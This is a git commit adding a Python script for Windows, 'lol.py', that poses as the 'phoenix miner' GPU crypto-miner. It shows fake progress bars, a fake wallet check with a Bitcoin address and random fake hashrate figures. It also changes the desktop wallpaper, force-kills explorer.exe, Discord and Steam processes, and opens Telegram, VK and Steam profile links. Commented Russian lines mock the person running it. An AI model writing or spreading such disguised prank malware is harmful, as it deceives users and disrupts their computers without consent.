332fcb19501bddcd4569c06af5384360cf09f8b4
disabledpeople <91789063+disabledpeople@users.noreply.github.com>
2022-04-30 12:37:35 +0300

    Add files via upload

---
+++ folder/lol.py
@@ -0,0 +1,199 @@
+import os
+import ctypes
+
+folder = r"C:\folder\backup"
+file_name = r"1.jpg"
+
+full_path = os.path.join(folder, file_name)
+wallpaper = bytes(full_path, 'utf-8')
+
+ctypes.windll.user32.SystemParametersInfoA(20, 0, wallpaper, 3)
+
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print("Запуск phoenix miner  5.9d - AMD+NVIDIA GPU Miner")
+import time
+def printProgressBar (iteration, total, prefix = '', suffix = '', decimals = 1, length = 100, fill = '█', printEnd = "\r"):
+    """
+    Call in a loop to create terminal progress bar
+    @params:
+        iteration   - Required  : current iteration (Int)
+        total       - Required  : total iterations (Int)
+        prefix      - Optional  : prefix string (Str)
+        suffix      - Optional  : suffix string (Str)
+        decimals    - Optional  : positive number of decimals in percent complete (Int)
+        length      - Optional  : character length of bar (Int)
+        fill        - Optional  : bar fill character (Str)
+        printEnd    - Optional  : end character (e.g. "\r", "\r\n") (Str)
+    """
+    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
+    filledLength = int(length * iteration // total)
+    bar = fill * filledLength + '-' * (length - filledLength)
+    print('\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix), end = printEnd)
+    # Print New Line on Complete
+    if iteration == total:
+        print()
+# A List of Items
+items = list(range(0, 57))
+l = len(items)
+# Initial call to print 0% progress
+printProgressBar(0, l, prefix = 'Progress:', suffix = 'Complete', length = 50)
+for i, item in enumerate(items):
+    # Do stuff...
+    time.sleep(0.1)
+    # Update Progress Bar
+    printProgressBar(i + 1, l, prefix = 'Progress:', suffix = 'Complete', length = 50)
+
+
+print("Проверка кошелька(открытый)-1LWnx4iRvK1yT7eB6GoMkFoN3DQ49zYDgF")
+
+from time import sleep
+from sys import stdout
+
+JUMP_LEFT_SEQ = '\u001b[100D'
+DELAY = 0.05
+
+def loading():
+    for i in range(0, 101):
+        sleep(DELAY)
+        print(JUMP_LEFT_SEQ, end='')
+        print(f'Progress: {i:0>3}%', end='')
+        stdout.flush()
+    print()
+
+loading()
+
+print("Проверин статус: ✔")
+
+print("Запуск майнера")
+import time
+def printProgressBar (iteration, total, prefix = '', suffix = '', decimals = 1, length = 100, fill = '█', printEnd = "\r"):
+    """
+    Call in a loop to create terminal progress bar
+    @params:
+        iteration   - Required  : current iteration (Int)
+        total       - Required  : total iterations (Int)
+        prefix      - Optional  : prefix string (Str)
+        suffix      - Optional  : suffix string (Str)
+        decimals    - Optional  : positive number of decimals in percent complete (Int)
+        length      - Optional  : character length of bar (Int)
+        fill        - Optional  : bar fill character (Str)
+        printEnd    - Optional  : end character (e.g. "\r", "\r\n") (Str)
+    """
+    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
+    filledLength = int(length * iteration // total)
+    bar = fill * filledLength + '-' * (length - filledLength)
+    print('\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix), end = printEnd)
+    # Print New Line on Complete
+    if iteration == total:
+        print()
+# A List of Items
+items = list(range(0, 57))
+l = len(items)
+# Initial call to print 0% progress
+printProgressBar(0, l, prefix = 'Progress:', suffix = 'Complete', length = 50)
+for i, item in enumerate(items):
+    # Do stuff...
+    time.sleep(0.2)
+    # Update Progress Bar
+    printProgressBar(i + 1, l, prefix = 'Progress:', suffix = 'Complete', length = 50)
+
+import hashlib
+ 
+hash_object = hashlib.sha224(b'He23159llo World')
+hex_dig = hash_object.hexdigest()
+ 
+print(hex_dig)
+import time
+def printProgressBar (iteration, total, prefix = '', suffix = '', decimals = 1, length = 100, fill = '█', printEnd = "\r"):
+    """
+    Call in a loop to create terminal progress bar
+    @params:
+        iteration   - Required  : current iteration (Int)
+        total       - Required  : total iterations (Int)
+        prefix      - Optional  : prefix string (Str)
+        suffix      - Optional  : suffix string (Str)
+        decimals    - Optional  : positive number of decimals in percent complete (Int)
+        length      - Optional  : character length of bar (Int)
+        fill        - Optional  : bar fill character (Str)
+        printEnd    - Optional  : end character (e.g. "\r", "\r\n") (Str)
+    """
+    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
+    filledLength = int(length * iteration // total)
+    bar = fill * filledLength + '-' * (length - filledLength)
+    print('\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix), end = printEnd)
+    # Print New Line on Complete
+    if iteration == total:
+        print()
+# A List of Items
+items = list(range(0, 57))
+l = len(items)
+# Initial call to print 0% progress
+printProgressBar(0, l, prefix = 'Progress:', suffix = 'Complete', length = 50)
+for i, item in enumerate(items):
+    # Do stuff...
+    time.sleep(0.5)
+    # Update Progress Bar
+    printProgressBar(i + 1, l, prefix = 'Progress:', suffix = 'Complete', length = 50)
+
+print("История MH/s")
+from random import randint
+ 
+ 
+print("Вывод MH/s ", randint(10, 20))
+print("Вывод MH/s ", randint(10, 20))
+print("Вывод MH/s ", randint(10, 20))
+print("Вывод MH/s ", randint(10, 20))
+print("Вывод MH/s ", randint(10, 20))
+print("Вывод MH/s ", randint(10, 20))
+print("Вывод MH/s ", randint(10, 20))
+print("Вывод MH/s ", randint(10, 20))
+print("Вывод MH/s ", randint(10, 20))
+print("Вывод MH/s ", randint(10, 20))
+print("Вывод MH/s ", randint(10, 20))
+print("Вывод MH/s ", randint(10, 20))
+print("Вывод MH/s ", randint(10, 20))
+print("Вывод MH/s ", randint(10, 20))
+
+print("Сбой phoenix miner  5.9d - NVIDIA GPU Miner")
+
+#print("А чел забыл спросить я тебе доту запущю?")
+#print("А мне похуй")
+#print("")
+#print("")
+#print("")
+#print("")
+#print("")
+#print("GO")
+#print("")
+#print("")
+#print("")
+#print("")
+#print("")
+##print("")
+print("")
+print("")
+print("")
+print("")
+
+
+import os
+os.system('taskkill /f /im explorer.exe') 
+os.system('taskkill /f /im Discord.exe')
+os.system('taskkill /f /im steamwebhelper.exe')
+os.system('taskkill /f /im steamservice.exe')
+os.system('taskkill /f /im ')
+#my_file = open("dota2.exe", "r") # Open a file
+#import os                                   -
+#os.system(r'c:\Users\Yura2\Desktop\fix2.py')-
+import webbrowser
+webbrowser.open('https://t.me/Betar1ka', new=2)
+webbrowser.open('https://vk.com/inst_statiews', new=2)
+webbrowser.open('https://steamcommunity.com/profiles/76561199002004401/', new=2)
